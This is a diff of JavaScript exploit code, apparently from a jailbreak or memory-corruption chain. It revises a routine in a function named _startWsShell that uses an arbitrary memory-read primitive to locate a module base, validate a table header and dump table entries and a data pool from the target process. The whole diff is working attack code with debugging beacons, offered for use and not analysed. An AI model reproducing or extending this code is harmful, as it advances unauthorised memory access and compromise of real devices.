@@ -5692,38 +5692,27 @@ function _startWsShell(){
           if(!(can>0x1000000n)){reply.err='canary fail';break;}
           reply.base='0x'+B.toString(16);
           var tbl=B+0x48000n;
-          /* header: magic + size. The header layout is not fully pinned
-           * (magic@+0; size candidates at +4/+8/+C) - SELF-VALIDATE with
-           * the two PROVEN anchors: entry#5.text == 0x2C0 (thr_self,
-           * E2-landed) and entry#8.text == 0x410 (thr_new, game-lane
-           * cross-matched). Try each (size-slot, entry-base) combo. */
+          /* header (confirmed LIVE via the XT-2 beacon): magic32 @+0,
+           * COUNT32 @+8 (w1 lo32 = 0x82C = 2092), entries @+0xC, pool
+           * @+0xC+nE*8. Anchors #5=0x2C0/#8=0x410 = sanity beacons. */
           var hdrW=S.absRead(tbl,16);
           var magic=Number(hdrW[0]&0xFFFFFFFFn);
-          XT('2 hdr magic=0x'+magic.toString(16)+' w1=0x'+hdrW[1].toString(16));
+          var count=Number(hdrW[1]&0xFFFFFFFFn);
+          XT('2 hdr magic=0x'+magic.toString(16)+' w0hi=0x'+Number(hdrW[0]>>32n).toString(16)+' count=0x'+count.toString(16)+' w1hi=0x'+Number(hdrW[1]>>32n).toString(16));
           if(magic!==0x3b031b01){reply.err='bad magic 0x'+magic.toString(16);break;}
-          var sizeCands=[Number(hdrW[0]>>32n),Number(hdrW[1]&0xFFFFFFFFn),Number(hdrW[1]>>32n)];
-          var baseCands=[0xC,0x10,0x8];
-          var nE=0,eBase=0,eWords=null;
-          for(var sc=0;sc<sizeCands.length;sc++){
-            var sz=sizeCands[sc];
-            if(sz%8!==0)continue;
-            var n=Math.floor((sz-12)/8);
-            if(n<64||n>4096)continue;
-            for(var bc=0;bc<baseCands.length;bc++){
-              var eB=baseCands[bc];
-              var w5=S.absRead(tbl+BigInt(eB+5*8),8)[0];
-              var w8=S.absRead(tbl+BigInt(eB+8*8),8)[0];
-              var t5=0x48000+Number(BigInt.asIntN(32,w5&0xFFFFFFFFn));
-              var t8=0x48000+Number(BigInt.asIntN(32,w8&0xFFFFFFFFn));
-              if(t5===0x2C0&&t8===0x410){nE=n;eBase=eB;break;}
-            }
-            if(nE)break;
-          }
-          if(!nE){reply.err='no header combo satisfies anchors (#5=0x2C0,#8=0x410)';break;}
+          if(count<64||count>4096){reply.err='count implausible 0x'+count.toString(16);break;}
+          var nE=count,eBase=0xC;
+          /* anchor sanity (non-fatal): #5=0x2C0 thr_self, #8=0x410 thr_new */
+          var w5=S.absRead(tbl+BigInt(eBase+40),8)[0];
+          var w8=S.absRead(tbl+BigInt(eBase+64),8)[0];
+          var t5=0x48000+Number(BigInt.asIntN(32,w5&0xFFFFFFFFn));
+          var t8=0x48000+Number(BigInt.asIntN(32,w8&0xFFFFFFFFn));
+          XT('H anchors #5=0x'+t5.toString(16)+' #8=0x'+t8.toString(16));
+          reply.anchors=['0x'+t5.toString(16),'0x'+t8.toString(16)];
           reply.n=nE;reply.ebase=eBase;
-          XT('3 nEntries='+nE+' eBase=+0x'+eBase.toString(16)+' size=0x'+(nE*8+12).toString(16));
+          XT('3 nEntries='+nE+' eBase=+0x'+eBase.toString(16));
           /* all entries, chunked reads */
-          eWords=[];
+          var eWords=[];
           for(var off=0;off<nE*8;off+=0x800){
             var ck=Math.min(0x800,nE*8-off);
             var ws=S.absRead(tbl+BigInt(eBase+off),ck);
@@ -5756,8 +5745,8 @@ function _startWsShell(){
           var pool=Math.max(0x2000,Math.min((maxA||0)+0x100,0x10000,poolCap));
           if(msg.pool)pool=Math.min(parseInt(msg.pool),poolCap);
           XT('6 pool=0x'+pool.toString(16)+' base=+0x'+(eBase+nE*8).toString(16));
-          for(var po=0;po<pool;po+=0x400){
-            var pc=Math.min(0x400,pool-po);
+          for(var po=0;po<pool;po+=0x800){
+            var pc=Math.min(0x800,pool-po);
             var pws=S.absRead(poolBase+BigInt(po),pc);
             var hx='';
             for(var pi=0;pi<pws.length;pi++){
